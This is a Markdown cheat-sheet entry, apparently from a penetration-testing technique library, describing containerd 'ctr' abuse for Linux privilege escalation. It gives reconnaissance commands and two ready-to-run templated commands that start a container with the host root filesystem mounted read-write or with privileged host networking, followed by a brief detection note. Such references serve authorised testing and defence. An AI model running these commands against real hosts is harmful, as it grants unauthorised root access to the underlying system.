---
technique: containerd ctr Abuse
category: privilege-escalation
targets: Linux containerd
protocols: Local
remote_capable: false
tags: linux privilege-escalation containerd ctr containers
---

# containerd ctr Abuse

containerd `ctr` abuse uses runtime access to start containers with host mounts or privileged settings.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| ctr access | Current user must run `ctr` against containerd |
| Available image | A local or pullable image must exist |
| Runtime permission | Host mount or privileged execution must be allowed |

## Linux

### Locate ctr

#sh #containerd #recon

Find the `ctr` client.

```sh title:"Locate ctr binary"
which ctr
```
<!-- cheat -->

### List namespaces

#sh #containerd #recon

List containerd namespaces.

```sh title:"List containerd namespaces"
ctr namespaces list
```
<!-- cheat -->

### List images

#sh #containerd #recon

List container images in a namespace.

```sh title:"List containerd images"
ctr --namespace "$namespace" images list
```
<!-- cheat
var namespace
-->

### Run host mount container

#sh #containerd #containers

Run a container with the host root mounted inside it.

```sh title:"Run containerd host mount container"
ctr --namespace "$namespace" run --mount type=bind,src=/,dst=/host,options=rbind:rw -t "$image_name" "$container_name" /bin/sh
```
<!-- cheat
var namespace
var image_name
var container_name
-->

### Run privileged container

#sh #containerd #containers

Run a privileged container with host networking.

```sh title:"Run privileged containerd container"
ctr --namespace "$namespace" run --privileged --net-host -t "$image_name" "$container_name" /bin/sh
```
<!-- cheat
var namespace
var image_name
var container_name
-->

## Detection

Monitor containerd client access, new privileged containers, and containers launched with host filesystem bind mounts.
